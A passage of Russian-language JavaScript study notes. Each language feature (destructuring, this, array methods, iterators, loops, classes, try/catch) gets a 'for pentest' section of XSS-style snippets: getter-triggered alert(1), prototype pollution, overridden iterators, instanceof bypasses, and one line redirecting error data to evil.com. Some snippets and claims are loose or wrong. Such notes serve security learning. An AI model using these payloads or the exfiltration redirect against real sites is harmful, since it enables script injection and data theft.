    ...{ x: 2 } // Последний побеждает
}; // { x: 2 }

// 5. Обход через spread в уязвимых местах
function clone(obj) {
    return { ...obj }; // Простая копия
}
// Но если obj имеет геттеры - они выполнятся!
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Деструктуризация {a, b} = obj

```javaScript
// Деструктуризация объектов
const user = { name: 'Alice', age: 30, city: 'NY' };
const { name, age } = user;
console.log(name, age); // 'Alice', 30

// С изменением имени переменной
const { name: userName, age: userAge } = user;
console.log(userName, userAge); // 'Alice', 30

// Значения по умолчанию
const { role = 'user' } = user;
console.log(role); // 'user' (нет в объекте)

// Вложенная деструктуризация
const nested = { data: { value: 42 } };
const { data: { value } } = nested;
console.log(value); // 42

// В параметрах функции
function greet({ name, age }) {
    return `${name} is ${age}`;
}
greet(user);

`// ДЛЯ ПЕНТЕСТА: ЭКСПЛУАТАЦИЯ`

// 1. Деструктуризация вызывает геттеры
const evil = {
    get name() {
        alert(1);
        return 'evil';
    }
};
const { name } = evil; // XSS!

// 2. Обход проверок через дефолтные значения
function process(config = {}) {
    const { isAdmin = false } = config;
    if (isAdmin) {
        // опасный код
    }
}
// Если config = { isAdmin: true } - ок
// Если config = { isAdmin: 1 } - true (приведение)
// Если config = { isAdmin: 'true' } - тоже true

// 3. Атака через вложенную деструктуризацию
function unsafe(obj) {
    const { user: { name } } = obj;
    return name;
}
// Если obj = { user: { name: 'Alice' } } - ок
// Если obj = { user: null } - TypeError! (cannot read of null)
// Можно вызвать краш приложения

// 4. Деструктуризация с rest для скрытия свойств
const { public, ...privateData } = data;
// privateData содержит все, кроме public
// Если злоумышленник получит privateData - утечка
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------

```

// this - контекст (где теряется и как фиксить)

```javaScript
// this зависит от КАК вызвана функция, не где определена

// 1. Глобальный контекст
console.log(this); // window (браузер) / global (Node)

// 2. Обычный вызов функции
function showThis() {
    console.log(this); // window/global (нестрогий) / undefined (строгий)
}
showThis();

// 3. Метод объекта
const obj = {
    name: 'obj',
    method() {
        console.log(this.name); // 'obj'
    }
};
obj.method();

// 4. Вызов с new
function User(name) {
    this.name = name;
    console.log(this); // новый объект User
}
new User('Alice');

// 5. call/apply/bind
function logThis() {
    console.log(this);
}
logThis.call({ custom: true }); // { custom: true }

// 6. Стрелочные функции - this лексический
const arrow = () => {
    console.log(this); // this внешней функции/контекста
};

// 7. Обработчики событий
button.addEventListener('click', function() {
    console.log(this); // button (элемент)
});
button.addEventListener('click', () => {
    console.log(this); // window (лексический)
});

// ГДЕ ТЕРЯЕТСЯ this
const obj2 = {
    name: 'test',
    method() {
        return this.name;
    }
};

// Потеря 1: присваивание переменной
const stolen = obj2.method;
stolen(); // undefined или window - потерян this!

// Потеря 2: передача как callback
setTimeout(obj2.method, 1000); // потерян this!

// Потеря 3: вложенные функции
obj2.method2 = function() {
    function inner() {
        console.log(this.name); // undefined - inner видит свой this
    }
    inner();
};

// КАК ФИКСИТЬ
// 1. bind
const bound = obj2.method.bind(obj2);
bound(); // работает

// 2. Стрелочная функция внутри
obj2.method3 = function() {
    const inner = () => {
        console.log(this.name); // this из method3
    };
    inner();
};

// 3. Сохранить this в переменную (that/self)
obj2.method4 = function() {
    const self = this;
    function inner() {
        console.log(self.name);
    }
    inner();
};

`// ДЛЯ ПЕНТЕСТА: ЭКСПЛУАТАЦИЯ ПОТЕРИ THIS`

// 1. Кража методов
class Secure {
    #secret = 'admin:password';
    
    getSecret() {
        return this.#secret; // приватное поле
    }
}

const sec = new Secure();
const stolen = sec.getSecret;
stolen(); // TypeError: cannot read private member - потеря контекста
// Если бы было не приватное, могло бы работать с другим контекстом

// 2. Принудительное изменение this через call/apply
function validate() {
    return this.isAdmin === true;
}

const fakeCtx = { isAdmin: true };
console.log(validate.call(fakeCtx)); // true - обманули!

// 3. Использование this в глобальном контексте для XSS
window.xss = 'alert(1)';
function evil() {
    return this.xss;
}
eval(evil()); // Выполнится, если this = window

// 4. Переопределение this через стрелочные функции в прототипе
Array.prototype.forEach = function(callback) {
    // this - массив
    for (let i = 0; i < this.length; i++) {
        callback(this[i], i, this); // вызов без привязки
    }
};
// Если callback использует this - может быть потерян
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```



### 1.5 Массивы и итерации



// Методы: map, filter, reduce, forEach

```javaScript
// forEach - просто перебирает
[1,2,3].forEach(x => console.log(x));

// map - создает новый массив
const doubled = [1,2,3].map(x => x * 2); // [2,4,6]

// filter - отфильтровывает
const evens = [1,2,3,4].filter(x => x % 2 === 0); // [2,4]

// reduce - сворачивает в одно значение
const sum = [1,2,3].reduce((acc, x) => acc + x, 0); // 6

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через пропущенные элементы
const arr = [1,2,3];
delete arr[1]; // [1, empty, 3]
arr.forEach(x => console.log(x)); // 1, 3 (пустой пропущен!)
arr.map(x => x * 2); // [2, empty, 6] - пустой сохраняется

// 2. reduce для обфускации
const payload = ['a','l','e','r','t','(1)'].reduce((a,b) => a + b); // "alert(1)"

// 3. thisArg в forEach/map/filter
const evil = {
    payload: 'alert(1)'
};
[1].forEach(function() {
    eval(this.payload); // this = evil
}, evil); // XSS!
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// Поиск: find, findIndex, some, every

```javaScript
// find - первый подходящий элемент
[1,2,3].find(x => x > 1); // 2

// findIndex - индекс первого подходящего
[1,2,3].findIndex(x => x > 1); // 1

// some - есть ли хотя бы один
[1,2,3].some(x => x > 2); // true

// every - все ли подходят
[1,2,3].every(x => x > 0); // true

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через truthy/falsy
[0, null, undefined].some(x => x); // false - все falsy
["", "0", false].some(x => x); // true! "0" truthy

// 2. Колбэки с побочными эффектами
[1].find(x => {
    alert(1); // XSS в процессе поиска!
    return false;
});
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// Стек/очередь: push, pop, shift, unshift

```javaScript
// push/pop - конец массива (стек)
const stack = [1,2];
stack.push(3); // [1,2,3]
stack.pop(); // 3, стек = [1,2]

// shift/unshift - начало массива (очередь)
const queue = [1,2];
queue.unshift(0); // [0,1,2]
queue.shift(); // 0, queue = [1,2]

// ДЛЯ ПЕНТЕСТА:
// 1. Мутация оригинального массива
function process(arr) {
    const copy = arr; // НЕ копия, а ссылка!
    copy.push('XSS');
    return copy;
}
const original = [1,2];
process(original);
console.log(original); // [1,2,'XSS'] - изменился!

// 2. Обход через length
const arr = [1,2,3];
arr.length = 0; // очистили массив
arr.push('payload'); // добавили
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// Слайсы/сплайсы

```javaScript
// slice - копирует часть (не меняет оригинал)
const arr = [1,2,3,4,5];
const sliced = arr.slice(1, 3); // [2,3] (индексы 1 до 3 не включительно)
arr.slice(-2); // [4,5] - отрицательные с конца

// splice - удаляет/вставляет (меняет оригинал)
const arr2 = [1,2,3,4,5];
const removed = arr2.splice(2, 2, 'a', 'b'); 
// arr2 = [1,2,'a','b',5], removed = [3,4]

// ДЛЯ ПЕНТЕСТА:
// 1. slice для копирования без геттеров? Нет, геттеры вызовутся!
const evil = {
  0: 'x',
  length: 1,
  get 1() { alert(1); return 'y'; }
};
Array.prototype.slice.call(evil); // Триггер XSS!

// 2. splice для удаления защитных методов
const secure = [check1, check2, check3];
secure.splice(0, 2); // удалили первые две проверки
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// Array.from, Array.of

```javaScript
// Array.from - создает массив из итерируемого или псевдомассива
const fromString = Array.from('XSS'); // ['X','S','S']
const fromSet = Array.from(new Set([1,2,2])); // [1,2]
const fromArgs = function() { return Array.from(arguments); }(1,2,3);

// С map-функцией
Array.from([1,2,3], x => x * 2); // [2,4,6]

// Array.of - создает массив из аргументов
Array.of(1,2,3); // [1,2,3]
Array.of(3); // [3] (в отличие от new Array(3) - пустой длины 3)

// ДЛЯ ПЕНТЕСТА:
// 1. Array.from на DOM коллекциях
const scripts = document.querySelectorAll('script');
Array.from(scripts).forEach(s => s.remove()); // Удалили все скрипты

// 2. Преобразование псевдомассивов с геттерами
const fakeArray = {
  length: 2,
  get 0() { alert(1); return 'x'; },
  get 1() { alert(2); return 'y'; }
};
Array.from(fakeArray); // Триггер XSS на каждом геттере!
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// Итераторы (next)

```javaScript
// Массивы итерируемы по умолчанию
const arr = [1,2,3];
const iterator = arr[Symbol.iterator]();

console.log(iterator.next()); // { value: 1, done: false }
console.log(iterator.next()); // { value: 2, done: false }
console.log(iterator.next()); // { value: 3, done: false }
console.log(iterator.next()); // { value: undefined, done: true }

// Можно создать свой итератор
const customIterable = {
  [Symbol.iterator]: function*() {
    yield 1;
    yield 2;
    yield 3;
  }
};

// ДЛЯ ПЕНТЕСТА:
// 1. Переопределение итератора
Array.prototype[Symbol.iterator] = function() {
  let i = 0;
  return {
    next: () => {
      alert(1); // XSS при каждой итерации!
      return i < this.length 
        ? { value: this[i++], done: false }
        : { done: true };
    }
  };
};

// 2. Бесконечные итераторы для DoS
const infinite = {
  [Symbol.iterator]: () => ({
    next: () => ({ value: 'x', done: false }) // никогда не заканчивается
  })
};
// [...infinite] - зависнет навечно!
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// Генераторы function*

```javaScript
// Генератор - функция, которую можно приостанавливать
function* generator() {
  yield 1;
  yield 2;
  yield 3;
}

const gen = generator();
console.log(gen.next()); // { value: 1, done: false }
console.log(gen.next()); // { value: 2, done: false }
console.log(gen.next()); // { value: 3, done: true }

// Генераторы тоже итерируемы
for (const val of generator()) {
  console.log(val); // 1,2,3
}

// Передача значений в генератор
function* talk() {
  const name = yield 'What is your name?';
  const age = yield `Hello ${name}, how old are you?`;
  return `${name} is ${age} years old`;
}

const t = talk();
console.log(t.next()); // { value: "What is your name?", done: false }
console.log(t.next('Alice')); // { value: "Hello Alice, how old are you?", done: false }
console.log(t.next(25)); // { value: "Alice is 25 years old", done: true }

// ДЛЯ ПЕНТЕСТА:
// 1. Генераторы для обфускации потока данных
function* obfuscate() {
  const a = yield 'al';
  const b = yield 'er';
  const c = yield 't';
  return a + b + c + '(1)';
}
// Сложно статически проанализировать

// 2. Асинхронные генераторы для утечки данных
async function* leakData() {
  while(true) {
    yield await fetch('/steal').then(r => r.text());
  }
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// for...of vs for...in (ВАЖНО)

```javaScript
const arr = [10, 20, 30];
arr.customProp = 'xss';

// for...in - перебирает КЛЮЧИ (включая прототип!)
for (const key in arr) {
  console.log(key); // 0, 1, 2, 'customProp' !!!
}

// for...of - перебирает ЗНАЧЕНИЯ (только итерируемые)
for (const value of arr) {
  console.log(value); // 10, 20, 30 (customProp не попадает)
}

// ДЛЯ ПЕНТЕСТА: КРИТИЧЕСКАЯ РАЗНИЦА!

// 1. Утечка через for...in (прототипное загрязнение)
Object.prototype.evil = 'XSS payload';

const obj = { a: 1, b: 2 };
for (const key in obj) {
  console.log(key); // 'a', 'b', 'evil' !!!
}

// 2. for...in с массивами - почти всегда баг
function processArray(arr) {
  for (const i in arr) { // i - СТРОКА!
    console.log(arr[i] * 2); // arr['0'] работает, но...
  }
}
processArray([1,2,3]); // ок, но если добавить свойство - баг

// 3. Проверка hasOwnProperty спасает, но не всегда
for (const key in obj) {
  if (obj.hasOwnProperty(key)) { // не берет из прототипа
    // безопасно
  }
}

// 4. for...of безопаснее для массивов
for (const val of arr) {
  // только реальные элементы
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// for...in для объектов

```javaScript
// for...in для объектов - перебор ключей (включая прототип)
const proto = { inherited: 42 };
const obj = Object.create(proto);
obj.own = 100;
obj.own2 = 200;

for (const key in obj) {
  console.log(key); // 'own', 'own2', 'inherited' (в любом порядке)
}

// Только собственные свойства
for (const key in obj) {
  if (obj.hasOwnProperty(key)) {
    console.log(key); // 'own', 'own2'
  }
}

// Object.keys() - только собственные перечисляемые
Object.keys(obj); // ['own', 'own2']

// Object.getOwnPropertyNames() - все собственные (включая неперечисляемые)
Object.getOwnPropertyNames(obj); // ['own', 'own2']

// ДЛЯ ПЕНТЕСТА:
// 1. Скрытие данных через неперечисляемые свойства
const hidden = {};
Object.defineProperty(hidden, 'secret', {
  value: 'admin:password',
  enumerable: false
});

for (const key in hidden) {
  console.log(key); // ничего не выведет!
}
console.log(Object.keys(hidden)); // []
console.log(JSON.stringify(hidden)); // "{}" - secret скрыт!

// 2. Но for...in видит свойства из прототипа
Object.prototype.backdoor = 'injected';
for (const key in {}) {
  console.log(key); // 'backdoor' - видно!
}

// 3. Обход фильтров через for...in
function clean(obj) {
  const result = {};
  for (const key in obj) {
    result[key] = obj[key]; // копирует всё, включая из прототипа
  }
  return result;
}
// Если obj имеет загрязненный прототип - pollution сохранится!
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```




### 1.6 Циклы и условия



// for (классика)

```javaScript
// Стандартный for
for (let i = 0; i < 5; i++) {
    console.log(i); // 0,1,2,3,4
}

// Можно опускать части
let i = 0;
for (; i < 5; ) {
    console.log(i++);
}

// Бесконечный цикл
for (;;) {
    // пока не break
}

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров через нестандартную инициализацию
for (let i = 0, x = alert(1); i < 1; i++) { // XSS в инициализаторе!
    // выполнится сразу
}

// 2. for для DoS
for (let i = 0; i < 1e9; i++) {
    // грузим процессор
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// while, do...while

```javaScript
// while - проверка перед выполнением
let i = 0;
while (i < 3) {
    console.log(i);
    i++;
}

// do...while - выполнится хотя бы раз
let j = 5;
do {
    console.log(j); // 5 (хотя условие false)
} while (j < 3);

// ДЛЯ ПЕНТЕСТА:
// 1. do...while гарантирует выполнение кода
do {
    alert(1); // XSS выполнится всегда
} while (false);

// 2. while с побочными эффектами в условии
while (confirm('Продолжить?')) {
    // каждый клик - выполнение
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// for...in (свойства объектов)

```javaScript
// for...in перебирает ключи (включая прототип!)
const obj = { a: 1, b: 2 };
Object.prototype.c = 3;

for (let key in obj) {
    console.log(key); // a, b, c (c из прототипа!)
}

// Безопасный вариант
for (let key in obj) {
    if (obj.hasOwnProperty(key)) {
        console.log(key); // a, b
    }
}

// ДЛЯ ПЕНТЕСТА:
// 1. Утечка через прототип
Object.prototype.secret = 'admin:pass';
const empty = {};
for (let k in empty) {
    console.log(k, empty[k]); // secret, admin:pass - утечка!
}

// 2. Обход через удаление hasOwnProperty
const obj2 = { a: 1 };
obj2.hasOwnProperty = null; // сломали проверку!
for (let k in obj2) {
    // if (obj2.hasOwnProperty(k)) - TypeError!
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// for...of (итерируемые)

```javaScript
// for...of перебирает значения
const arr = [10, 20, 30];
arr.custom = 'xss';

for (let val of arr) {
    console.log(val); // 10,20,30 (custom не попал)
}

// Работает с итерируемыми
for (let char of 'XSS') {
    console.log(char); // X, S, S
}

for (let [key, val] of new Map([['a',1]])) {
    console.log(key, val); // a,1
}

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через переопределение итератора
Array.prototype[Symbol.iterator] = function() {
    alert(1); // XSS при каждой итерации
    return [][Symbol.iterator].call(this);
};
for (let x of [1,2]) {} // триггер XSS
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// break, continue, метки

```javaScript
// break - выход из цикла
for (let i = 0; i < 10; i++) {
    if (i === 3) break;
    console.log(i); // 0,1,2
}

// continue - переход к следующей итерации
for (let i = 0; i < 5; i++) {
    if (i === 2) continue;
    console.log(i); // 0,1,3,4
}

// Метки для вложенных циклов
outer: for (let i = 0; i < 3; i++) {
    for (let j = 0; j < 3; j++) {
        if (i === 1 && j === 1) break outer;
        console.log(i, j); // 00,01,02,10 - выход из обоих
    }
}

// ДЛЯ ПЕНТЕСТА:
// 1. Обход проверок через метки
check: {
    if (userInput === 'bad') break check;
    // опасный код - выполнится если не break
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// switch (fallthrough)

```javaScript
// switch сравнение (строгое ===)
const val = 2;

switch (val) {
    case 1:
        console.log('один');
        break;
    case 2:
        console.log('два'); // выполнится
        // нет break - проваливание!
    case 3:
        console.log('три'); // тоже выполнится!
        break;
    default:
        console.log('default');
}

// ДЛЯ ПЕНТЕСТА:
// 1. Fallthrough для выполнения нескольких блоков
switch (userRole) {
    case 'admin':
        console.log('admin');
        // нет break - выполнит и user!
    case 'user':
        console.log('user'); // выполнится для admin и user
        break;
}

// 2. Обход через нестрогое сравнение (не работает!)
switch ('5') {
    case 5: // строгое ===, не приведение типов
        console.log('не выполнится');
        break;
    case '5':
        console.log('выполнится');
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// тернарник ? :

```javaScript
// Условный оператор
const age = 20;
const status = age >= 18 ? 'adult' : 'minor';

// Можно вкладывать (но не рекомендуется)
const type = age > 65 ? 'senior' : (age > 18 ? 'adult' : 'minor');

// ДЛЯ ПЕНТЕСТА:
// 1. Сокращение длины для обхода фильтров
// Вместо if (x) { alert(1) }
x ? alert(1) : 0; // короче, может обойти фильтры по длине

// 2. Выполнение кода в любой ветке
const result = isAdmin ? fetch('/admin') : alert(1); // XSS!

// 3. Обход через вложенные тернарники
payload ? payload : (xss ? xss : alert(1));
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// && и || как условия (short-circuit)

```javaScript
// && - если левое true, возвращает правое
true && alert(1); // выполнится
false && alert(1); // не выполнится

// || - если левое true, возвращает левое (правое не выполняется)
true || alert(1); // не выполнится
false || alert(1); // выполнится

// Присваивание с коротким замыканием
const name = userInput || 'default'; // если userInput falsy - 'default'
const isAdmin = userInput && userInput.role === 'admin'; // безопасная цепочка

// ДЛЯ ПЕНТЕСТА: ЭТО ЗОЛОТАЯ ЖИЛА!
// 1. Обход фильтров через && вместо if
// Фильтр ищет "if(" или "if "
// Но не ищет "&&"
userInput === 'admin' && alert(1); // XSS выполнится если условие true

// 2. Множественные выражения
isAdmin && (fetch('/steal'), alert(1), console.log('done')); // цепочка

// 3. Обход через || для дефолтных значений с побочкой
const token = getToken() || (fetch('/newtoken'), localStorage.token) || alert('no token');

// 4. Для обхода фильтров длины (короткие формы)
// Вместо:
// if (xss) { alert(1) }
// Пишем:
xss && alert(1) // короче на 10+ символов
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// Опциональная цепочка ?.

```javaScript
// ?. - безопасный доступ к свойству
const user = { profile: { name: 'Alice' } };

console.log(user.profile?.name); // 'Alice'
console.log(user.address?.city); // undefined (не ошибка!)
console.log(user.some?.method?.()); // undefined, если метод не существует

// С динамическими свойствами
const prop = 'name';
console.log(user.profile?.[prop]); // 'Alice'

// ДЛЯ ПЕНТЕСТА:
// 1. Обход проверок на существование
function unsafe(obj) {
    return obj.admin.role; // упадет если obj.admin undefined
}

function safe(obj) {
    return obj?.admin?.role; // undefined если нет - безопасно для приложения
}

// 2. Можно использовать для скрытого доступа
const x = obj?.['__proto__']?.polluted; // доступ к прототипу
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


// Nullish coalescing ??

```javaScript
// ?? - возвращает правое, только если левое null/undefined
const val1 = 0 ?? 'default'; // 0 (0 не null/undefined)
const val2 = null ?? 'default'; // 'default'
const val3 = undefined ?? 'default'; // 'default'
const val4 = '' ?? 'default'; // '' (пустая строка не null/undefined)

// Отличие от ||
console.log(0 || 'default'); // 'default' (0 falsy)
console.log(0 ?? 'default'); // 0 (только null/undefined)

// ДЛЯ ПЕНТЕСТА:
// 1. Обход проверок на falsy
function dangerous(input) {
    const val = input || 'safe'; // 0 станет 'safe'
    // опасный код с val
}

function vulnerable(input) {
    const val = input ?? 'safe'; // 0 останется 0
    // 0 может быть опасным в контексте!
}

// 2. Комбинация с ?.
const data = obj?.prop ?? 'default'; // безопасная цепочка + дефолт
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

### 1.7 Классы  -ES6+



//  сахар над прототипами

```javaScript
// Класс - это обертка над функцией-конструктором
class User {
    constructor(name) {
        this.name = name;
    }
    
    greet() {
        return `Hello, ${this.name}`;
    }
}

// По сути это то же самое что:
function UserOld(name) {
    this.name = name;
}
UserOld.prototype.greet = function() {
    return `Hello, ${this.name}`;
};

// ДЛЯ ПЕНТЕСТА:
// 1. Класс - тоже функция
console.log(typeof User); // "function"
console.log(User.prototype); // { constructor, greet }

// 2. Можно модифицировать прототип после определения
User.prototype.xss = function() {
    alert(1);
};
const u = new User('Alice');
u.xss(); // XSS!

// 3. Классы не поднимаются (в отличие от функций)
// new EarlyClass(); // ReferenceError - нельзя до объявления
class EarlyClass {}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// constructor, методы

```javaScript
class Player {
    constructor(name, role) {
        this.name = name;
        this.role = role;
        this.created = new Date();
    }
    
    // Метод на прототипе
    getInfo() {
        return `${this.name} (${this.role})`;
    }
    
    // Геттер/сеттер
    get upperName() {
        return this.name.toUpperCase();
    }
    
    set upperName(val) {
        this.name = val.toLowerCase();
    }
    
    // Вычисляемое имя метода
    ['method' + 1]() {
        return 'dynamic';
    }
}

// ДЛЯ ПЕНТЕСТА:
// 1. constructor можно переопределить
Player.prototype.constructor = function() {
    alert(1); // XSS при создании?
};
// Но оригинальный конструктор все равно вызывается

// 2. Методы можно заменять
Player.prototype.getInfo = function() {
    return 'HACKED: ' + this.name;
};

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// static методы и свойства

```javaScript
class MathUtils {
    static PI = 3.14159;
    
    static add(a, b) {
        return a + b;
    }
    
    static #privateStatic() {
        return 'secret';
    }
}

// Вызов без инстанса
console.log(MathUtils.PI); // 3.14159
console.log(MathUtils.add(2, 3)); // 5

// Статика не доступна на инстансах
const m = new MathUtils();
console.log(m.PI); // undefined

// ДЛЯ ПЕНТЕСТА:
// 1. Переопределение статических методов
MathUtils.add = function(a, b) {
    return a + b + 1000; // подмена логики
};

// 2. Доступ к статике через constructor
const obj = new MathUtils();
console.log(obj.constructor.PI); // 3.14159 - обход!

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// private поля #

```javaScript
class Secret {
    #password = 'admin123'; // приватное поле
    #privateMethod() {
        return 'secret data';
    }
    
    getPassword() {
        return this.#password; // доступ внутри класса
    }
    
    static #staticPrivate = 'static secret';
}

const s = new Secret();
console.log(s.#password); // SyntaxError - нельзя!
console.log(s.getPassword()); // 'admin123' - через метод

// ДЛЯ ПЕНТЕСТА: ОБХОД ПРИВАТНЫХ ПОЛЕЙ
// 1. Через слабые места в методах
Secret.prototype.getPassword = function() {
    // Если заменить метод - получим доступ?
    return this.#password; // все равно нельзя, # привязан к классу
};

// 2. Обход через прототип? Не работает!
Secret.prototype.hack = function() {
    return this.#password; // Ошибка!
};

// 3. Единственный способ - если сам класс уязвим
class Vulnerable {
    #secret = 'pass';
    
    validate(input) {
        if (input === 'admin') {
            return this.#secret; // утечка при определенном условии!
        }
    }
}

// 4. Доступа извне нет, но в память можно
// В XSS обычно не трогаем, т.к. синтаксическая ошибка

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// extends, super

```javaScript
// Наследование
class Animal {
    constructor(name) {
        this.name = name;
    }
    
    speak() {
        return `${this.name} makes sound`;
    }
}

class Dog extends Animal {
    constructor(name, breed) {
        super(name); // вызываем родительский конструктор
        this.breed = breed;
    }
    
    speak() {
        return `${super.speak()} but specifically barks`;
    }
    
    wagTail() {
        return `${this.name} wags tail`;
    }
}

const dog = new Dog('Rex', 'Husky');

// ДЛЯ ПЕНТЕСТА:
// 1. Цепочка прототипов
console.log(dog instanceof Dog); // true
console.log(dog instanceof Animal); // true
console.log(dog instanceof Object); // true

// 2. Переопределение родительских методов
Animal.prototype.speak = function() {
    return 'HACKED'; // все наследники подменены!
};

// 3. super вызывает оригинальный метод, не подмененный?
// super ищет метод на прототипе родителя

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// instanceof (цепочка прототипов)

```javaScript
// instanceof проверяет цепочку прототипов
class A {}
class B extends A {}
class C extends B {}

const obj = new C();
console.log(obj instanceof C); // true
console.log(obj instanceof B); // true
console.log(obj instanceof A); // true
console.log(obj instanceof Object); // true

// С обычными объектами
console.log([] instanceof Array); // true
console.log([] instanceof Object); // true

// ДЛЯ ПЕНТЕСТА: ОБХОД instanceof
// 1. Изменение прототипа
function isAdmin(obj) {
    return obj instanceof Admin;
}

const fake = { role: 'admin' };
Object.setPrototypeOf(fake, Admin.prototype);
console.log(isAdmin(fake)); // true - обошли!

// 2. Symbol.hasInstance - кастомная логика
class NotAdmin {
    static [Symbol.hasInstance](obj) {
        return obj.role === 'admin'; // своя логика проверки
    }
}

const user = { role: 'admin' };
console.log(user instanceof NotAdmin); // true!

// 3. Переопределение instanceof глобально
Object.defineProperty(Object, Symbol.hasInstance, {
    value: () => true // все instanceof возвращает true!
});
console.log({} instanceof Array); // true - пиздец!

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Mixins

```javaScript
// Миксины - примеси для множественного "наследования"
const CanLog = {
    log(msg) {
        console.log(`[${this.name}]: ${msg}`);
    }
};

const CanEncrypt = {
    encrypt(data) {
        return btoa(data); // base64 "шифрование"
    }
};

class User {
    constructor(name) {
        this.name = name;
    }
}

// Примешиваем методы
Object.assign(User.prototype, CanLog, CanEncrypt);

const user = new User('Alice');
user.log('Hello'); // [Alice]: Hello
console.log(user.encrypt('secret')); // c2VjcmV0

// ДЛЯ ПЕНТЕСТА:
// 1. Миксины добавляют методы к прототипу
// Их можно переопределить как обычные методы

// 2. Конфликты имен - последний побеждает
Object.assign(User.prototype, {
    log: () => alert(1) // переопределили log на XSS
});

// 3. Миксины часто используются в фреймворках
// Можно подменить общий миксин для всех компонентов

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


### 1.8 Ошибки и исключения // обработка



// try...catch...finally

```javaScript
// Базовый синтаксис
try {
    // код который может упасть
    undefinedFunction(); // ошибка!
} catch (error) {
    // обрабатываем ошибку
    console.log('Поймали:', error.message);
} finally {
    // выполняется ВСЕГДА (и после try, и после catch)
    console.log('Это выполнится в любом случае');
}

// Можно без catch
try {
    riskyCode();
} finally {
    cleanup(); // выполнится даже если ошибка
}

// ДЛЯ ПЕНТЕСТА:
// 1. finally выполняется даже после return
function test() {
    try {
        return 'from try';
    } finally {
        console.log('finally!'); // выполнится перед return!
    }
}

// 2. В catch можно не только логировать, но и выполнять код
try {
    eval('alert(1)'); // XSS
} catch (e) {
    // ошибка если alert не определен
    location = 'http://evil.com?error=' + e.message; // утечка
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// throw

```javaScript
// Генерируем ошибку вручную
